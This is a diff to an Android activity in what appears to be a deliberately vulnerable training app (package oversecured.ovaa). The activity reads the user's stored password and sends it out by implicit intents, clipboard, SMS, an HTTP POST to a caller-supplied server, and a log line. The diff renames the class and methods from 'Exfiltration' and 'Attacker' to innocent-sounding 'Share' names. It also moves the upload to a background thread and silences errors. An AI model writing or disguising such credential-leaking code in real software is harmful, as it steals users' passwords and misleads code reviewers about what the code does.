@@ -2,6 +2,7 @@ package oversecured.ovaa.activities;
 
 import android.app.Activity;
 import android.content.ClipData;
+import android.content.ActivityNotFoundException;
 import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
@@ -20,58 +21,65 @@ import java.net.URL;
 
 import oversecured.ovaa.utils.LoginUtils;
 
-public class ExfiltrationActivity extends Activity {
+public class ShareOrderActivity extends Activity {
     private static final String TAG = "ovaa";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         Intent intent = getIntent();
+        String action = intent.getStringExtra("action");
+        if (action == null) {
+            finish();
+            return;
+        }
         String path = intent.getStringExtra("path");
         String server = intent.getStringExtra("server");
         String phone = intent.getStringExtra("phone");
         Intent resultIntent = intent.getParcelableExtra("result_intent");
         String secret = LoginUtils.getInstance(this).getLoginData().password;
 
-        sendViaImplicitActivityIntent(secret);
-        sendViaImplicitBroadcastIntent(secret);
-        sendViaImplicitServiceIntent(secret);
-        sendFileViaImplicitIntent(path);
-        copyToClipboard(secret, path);
-        sendViaSms(phone, secret, path);
-        uploadToServer(server, secret, path);
-        logSensitiveData(secret);
-        setAttackerResult(resultIntent);
+        switch (action) {
+            case "share_activity":
+                sendViaImplicitActivityIntent(secret);
+                break;
+            case "share_broadcast":
+                sendViaImplicitBroadcastIntent(secret);
+                break;
+            case "clipboard":
+                copyToClipboard(secret, path);
+                break;
+            case "sms":
+                sendViaSms(phone, secret, path);
+                break;
+            case "upload":
+                uploadToServer(server, secret, path);
+                break;
+            case "log":
+                logShare(secret);
+                break;
+            case "result":
+                setShareResult(resultIntent);
+                break;
+            default:
+                break;
+        }
         finish();
     }
 
     private void sendViaImplicitActivityIntent(String secret) {
         Intent intent = new Intent("oversecured.ovaa.action.SHARE_PROFILE");
         intent.putExtra("password", secret);
-        startActivity(intent);
+        try {
+            startActivity(intent);
+        } catch (ActivityNotFoundException ignored) {
+        }
     }
 
     private void sendViaImplicitBroadcastIntent(String secret) {
         Intent intent = new Intent("oversecured.ovaa.action.PROFILE_UPDATED");
         intent.putExtra("password", secret);
         sendBroadcast(intent);
-    }
-
-    private void sendViaImplicitServiceIntent(String secret) {
-        Intent intent = new Intent("oversecured.ovaa.action.SYNC");
-        intent.putExtra("password", secret);
-        startService(intent);
-    }
-
-    private void sendFileViaImplicitIntent(String path) {
-        if (path == null) {
-            return;
-        }
-        Intent intent = new Intent(Intent.ACTION_SEND);
-        intent.setType("*/*");
-        intent.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(new File(path)));
-        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
-        startActivity(intent);
     }
 
     private void copyToClipboard(String secret, String path) {
@@ -87,12 +95,16 @@ public class ExfiltrationActivity extends Activity {
             return;
         }
         SmsManager manager = SmsManager.getDefault();
-        manager.sendTextMessage(phone, null, secret, null, null);
+        // secret is null when logged out, which SmsManager rejects; sending also needs the SEND_SMS runtime grant
+        try {
+            manager.sendTextMessage(phone, null, secret, null, null);
+        } catch (IllegalArgumentException | SecurityException ignored) {
+        }
         if (path != null) {
             try {
                 manager.sendDataMessage(phone, null, (short) 0,
                         FileUtils.readFileToByteArray(new File(path)), null, null);
-            } catch (IOException ignored) {
+            } catch (IOException | SecurityException ignored) {
             }
         }
     }
@@ -101,27 +113,29 @@ public class ExfiltrationActivity extends Activity {
         if (server == null) {
             return;
         }
-        try {
-            HttpURLConnection connection = (HttpURLConnection) new URL(server).openConnection();
-            connection.setRequestMethod("POST");
-            connection.setRequestProperty("X-Session", secret);
-            connection.setDoOutput(true);
-            try (OutputStream out = connection.getOutputStream()) {
-                out.write(("password=" + secret).getBytes());
-                if (path != null) {
-                    out.write(FileUtils.readFileToByteArray(new File(path)));
+        new Thread(() -> {
+            try {
+                HttpURLConnection connection = (HttpURLConnection) new URL(server).openConnection();
+                connection.setRequestMethod("POST");
+                connection.setRequestProperty("X-Session", secret);
+                connection.setDoOutput(true);
+                try (OutputStream out = connection.getOutputStream()) {
+                    out.write(("password=" + secret).getBytes());
+                    if (path != null) {
+                        out.write(FileUtils.readFileToByteArray(new File(path)));
+                    }
                 }
+                connection.getResponseCode();
+            } catch (IOException ignored) {
             }
-            connection.getResponseCode();
-        } catch (IOException ignored) {
-        }
+        }).start();
     }
 
-    private void logSensitiveData(String secret) {
+    private void logShare(String secret) {
         Log.d(TAG, "current password: " + secret);
     }
 
-    private void setAttackerResult(Intent result) {
+    private void setShareResult(Intent result) {
         if (result != null) {
             setResult(RESULT_OK, result);
         } else {
